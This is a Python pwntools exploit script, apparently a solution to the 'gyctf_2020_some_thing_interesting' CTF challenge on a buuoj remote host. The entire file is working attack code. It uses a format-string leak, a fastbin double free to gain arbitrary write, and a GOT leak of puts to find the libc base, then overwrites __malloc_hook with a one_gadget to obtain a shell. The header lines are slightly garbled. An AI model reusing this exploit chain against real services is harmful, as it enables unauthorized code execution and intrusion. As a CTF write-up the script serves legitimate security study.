0xc#+++++++++++++++++++exp.py++++++++++++++++++++
#!eusr/bin/env python
# f*- coding:utf-8 -*-                           
#Author: Square_R
#Time: 2021.02.01 20.44.30
#+++++++++++++++++++exp.py++++++++++++++++++++
from pwn import*
import sys

context.arch = 'amd64'

def add(size_0,cont_0,size_1,cont_1):
	sh.sendline('1')
	sh.sendline(str(size_0))
	sh.sendline(str(cont_0))
	sh.sendlineafter("> RE's length : ", str(size_1))
	sh.sendlineafter("> RE : ", str(cont_1))

def edit(index,cont_0,cont_1):
	sh.sendlineafter('to do :','2')
	sh.sendlineafter("> Oreo ID : ",str(index))
	sh.sendlineafter("> O : ",str(cont_0))
	sh.sendlineafter("> RE : ",str(cont_1))

def delete(index):
	sh.sendlineafter('to do :','3')
	sh.sendlineafter('> Oreo ID : ',str(index))

def leaker():
	sh.sendlineafter('to do :','0')
	sh.recvuntil('OreOOrereOOreO')
	add_leaked = sh.recv()
	success(add_leaked)
	index1 = add_leaked.find('\x55')
	index2 = add_leaked.find('\x56')
	index3 = add_leaked.find('\x7f')

	if index1 >= 5:
		add1 = u64(add_leaked[index1-5:index1+1].ljust(8,'\x00'))
		show_addr('add1',add1)
		return add1
	elif index2 >= 5:
		add2 = u64(add_leaked[index2-5:index2+1].ljust(8,'\x00'))
		show_addr('add2',add2)
		return add2
	elif index3 >= 5:
		add3 = u64(add_leaked[index3-5:index3+1].ljust(8,'\x00'))
		show_addr('add3',add3)
		return add3
	else:
		exit()

def show(index):
	sh.sendlineafter('to do :','4')
	sh.sendlineafter('> Oreo ID : ',str(index))
	sh.recvuntil("O is ")
	O_cont = u64(sh.recvuntil('\n',drop=1).ljust(8,'\x00'))
	sh.recvuntil('RE is')
	RE_cont = sh.recvuntil('\n',drop=1)
	return O_cont,RE_cont

def show_addr(name,addr):
	log.success('The '+str(name)+' Addr:' + str(hex(addr)))


host = 'node3.buuoj.cn'
port = 27075
local = 0
off = sys.argv[1]
if local:
	context.log_level = 'debug'
	libc=ELF('/glibc/x64/2.23/lib/libc-2.23.so')
	elf = ELF('./gyctf_2020_some_thing_interesting')
	sh = process('./gyctf_2020_some_thing_interesting')
else:
	context.log_level = 'debug'
	elf = ELF('./gyctf_2020_some_thing_interesting')
	libc=ELF('./libc-2.23.so')
	sh = remote(host,port)



def pwn():
	passwd = 'OreOOrereOOreO'
	sh.sendafter('please:',passwd + '%' + off + '$s')
	text_addr = leaker() - 0x1680#10_0x55 16 10
	bss_size = text_addr + 0x000000000202080
   	# gdb.attach(sh)
	show_addr('text_addr',text_addr)
	show_addr('bss_size',bss_size)

	add(0x61,'A'*8,0x70,'B'*8)
	add(0x61,'A'*8,0x70,'B'*8)
	delete(1)
	delete(2)
	delete(1)

	add(0x61,p64(bss_size+8),0x61,'')
	payload = p64(0x61) + p64(0x61) + p64(0)*8 + p64(text_addr + elf.got['puts'])
	# gdb.attach(sh,'b*$rebase(0x0000000000000F63)')

	add(0x61,'A'*0x10,0x61,payload)
	puts_addr,tmp = show(1)
	# pause()
	info('puts_addr:0x%x'%(puts_addr)) #libc---0x7f802e28d000
	if puts_addr > 0x7f0000000000:
		pass
	else:
		sh.close()
	libc_addr = puts_addr - libc.sym['puts']
	onegad = [0x45216,0x4526a,0xf02a4,0xf1147]
	# onegad = [0x3f3e6,0x3f43a,0xd5c07]
	onegadget = libc_addr +onegad[3]
	malloc_hook = libc_addr + libc.sym['__malloc_hook']

	show_addr('puts_addr',puts_addr)
	show_addr('libc_addr',libc_addr)
	show_addr('onegadget',onegadget)
	show_addr('malloc_hook',malloc_hook)

	payload = p64(0x61)*2 + p64(0)*8 + p64(malloc_hook)
	edit(4,'/bin/sh\x00',payload)
	edit(1,p64(onegadget),p64(onegadget))
	# gdb.attach(sh)
if __name__ == '__main__':
	# while i<0x10:		
	try:
		pwn()
		sh.interactive()
	except:
		# info("FAILED!!!")
		sh.close()
			# i += 1
